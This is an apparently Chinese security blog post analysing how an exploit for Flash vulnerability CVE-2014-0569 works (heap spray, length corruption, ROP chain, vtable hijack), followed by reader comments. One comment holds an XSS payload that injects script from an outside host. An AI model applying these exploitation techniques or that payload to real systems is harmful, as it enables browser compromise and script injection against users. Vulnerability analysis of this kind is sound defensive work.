<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">cve-2014-0569 漏洞利用分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">绿盟科技</a> <span class="bull">·</span> <time title="2014/11/26 10:09" ui-time="" datetime="2014/11/26 10:09" class="published ng-binding ng-isolate-scope">2014/11/26 10:09</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0×00 简述</h1><hr><p>来自CVE的漏洞描述：</p><p><img alt="enter image description here" img-src="a06929dd186bc9c632820bc04dc4c3f20d88caf8.jpg"></p><p>测试环境： Win7 SP1 + Flash ActiveX 15.0.0.167</p><h1>0×01 漏洞利用分析</h1><hr><p>介绍有关漏洞关键代码前，先看一下heap spray后的内存布局：</p><p><img alt="enter image description here" img-src="d7dd45f6afc5c2c80ee81be1a2fdf4d4a48c0da4.jpg"></p><p>简单描述为：</p><p><img alt="enter image description here" img-src="bf4c0c073047eb04ca9e81750be7dbe6a0bbc1e3.jpg"></p><p>漏洞致使Uint Vector的length字段被改写。</p><p>漏洞关键代码：</p><p><img alt="enter image description here" img-src="3ff483a2d65fa39de81d1ef05fd65f17f036df52.jpg"></p><p>红线标注的部分其操作流程：</p><p>取预定大小0×1000的ByteArray对象_loc3，赋值给domainMemory，以便casi32函数操作此内存</p><p>预置大小0×1000的ByteArray对象：</p><p><img alt="enter image description here" img-src="592ee6eae6d8548d1164063ff0adbc5589a9db97.jpg"></p><p>通过函数atomicCompareAndSwapLength将_loc3长度置0</p><p>casi32函数内由于整数溢出造成执行流改变，致使向_loc3偏移0×1000处成功写入0×40000001</p><p>上述过程细节：</p><p><img alt="enter image description here" img-src="2040745ab0fe533b77d068044444d2996a39207f.jpg"></p><p><img alt="enter image description here" img-src="478ebd5c888309a4fb4d2253ef1b5269e5051550.jpg"></p><p><img alt="enter image description here" img-src="45111efd1c470c8fe8427a5ebe4f91d53971feec.jpg"></p><p><img alt="enter image description here" img-src="4b3c7f5fe4c0c88a31b29f00fafba994993b55fe.jpg"></p><p>这样就可以以超长的Uint Vector为起点，读取预置的对象数据。</p><p>利用关键点：</p><p>搜索预置的sound对象进而计算出flash控件基址</p><p>预置的sound对象包含于喷射的少量Vector Object里，这里称之为vec_3。</p><p>具体的喷射代码：</p><p><img alt="enter image description here" img-src="494ab2b0f59d68e09077c83c2c2185f4f6a32234.jpg"></p><p>通过特征比对遍历以获取vec_3中元素：</p><p><img alt="enter image description here" img-src="ca37089ba5e4790c466795a5a1d39025e9b62929.jpg"></p><p>搜索到的其中一项：</p><p>计算flash控件基址：</p><p><img alt="enter image description here" img-src="e2de11f879456cdf8f20873fefed54526b630545.jpg"></p><p>在flash控件基址基础上获取rop链所需指令，用VirtualAlloc分配可执行内存过DEP。</p><p><img alt="enter image description here" img-src="1b7472a47edf5af7d6b01772ec29ba5e4643516d.jpg"></p><p><img alt="enter image description here" img-src="142baba618a6c9de4554d558cebbee5d54403172.jpg"></p><p>构造rop链（部分）：</p><p><img alt="enter image description here" img-src="08adda676b58b0d23157ed6dfde4e058075807ee.jpg"></p><p>修改sound对象虚表指针，并调用修改后的虚表函数将执行流导向stack pivot。</p><p><img alt="enter image description here" img-src="63e00c5d07685911eb9058fc2da02ef273855dc9.jpg"></p><p>sound对象虚表指针修改前后：</p><p><img alt="enter image description here" img-src="6ab8293cdd8fe2ba4d83597cc92ec4119204dc9d.jpg"></p><p><img alt="enter image description here" img-src="de60b260999feab70c4a0f3f0d55fafbd231f96d.jpg"></p><p>修改后的虚表指针指向内容：</p><p><img alt="enter image description here" img-src="d5d9172f5feea89881135a3efab59aee2122b2fa.jpg"></p><p>调用虚函数触发利用。</p><p><img alt="enter image description here" img-src="bdc8ed1380f7083eafd8640e43e421ad0cb9d79f.jpg"></p><h1>0×02 分析总结</h1><hr><p>完整的利用至少由两部分组成（html + swf），其中swf并不能独立执行，需要html传入的参数（shellcode），只拿到swf并不能获知攻击者的意图。</p><h1>0×03 参考文章</h1><hr><ol><li><p><a href="http://weibo.com/p/1001603769606924861349">CVE-2014-0569漏洞分析</a></p></li><li><p><a href="http://blogs.technet.com/b/mmpc/archive/2014/11/05/cracking-the-cve-2014-0569-nutshell.aspx">Cracking the CVE-2014-0569 nutshell</a></p></li></ol><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/4386" rel="bookmark" id="re1">One git command may cause you hacked(CVE-2014-9390)</a></li><li><a href="http://drops.wooyun.org/papers/3451" rel="bookmark" id="re2">CVE-2014-3393详细分析与复现</a></li><li><a href="http://drops.wooyun.org/papers/3194" rel="bookmark" id="re3">CVE-2014-3566 SSLv3 POODLE原理分析</a></li><li><a href="http://drops.wooyun.org/papers/3064" rel="bookmark" id="re4">CVE-2014-6271资料汇总</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">鬼哥</span> <span class="reply-time">2014-12-06 17:00:18</span></div><p></p><p>确实。哈哈。 我们差不多。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">紫衣大侠</span> <span class="reply-time">2014-11-27 10:02:46</span></div><p></p><p>亮了~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Clouds</span> <span class="reply-time">2014-11-27 09:37:34</span></div><p></p><p>[&lt;a href=&quot;test&quot; title=&quot;]&quot;&gt;&lt;/a&gt;DDDDDDDDDDDDDDDDDDDDDDDDDDD[&quot; &lt;!-- onmouseover=&quot;javascript:document.write(&#039;&amp;lt;script src=\&#039;http://sql.so/xFh4co?1417051496\&#039;&amp;gt;&amp;lt;\/script&amp;gt;&#039;);&quot;//&gt;&lt;!-- --&gt;:D&lt;a&gt;&lt;/a&gt;]</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Thorns</span> <span class="reply-time">2014-11-27 09:30:46</span></div><p></p><p>每次看到类似这样的帖子，就跟看天书一样。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-11-26 18:30:47</span></div><p></p><p>附上exp就更好了。</p><p></p></div></div></div></div></div></main>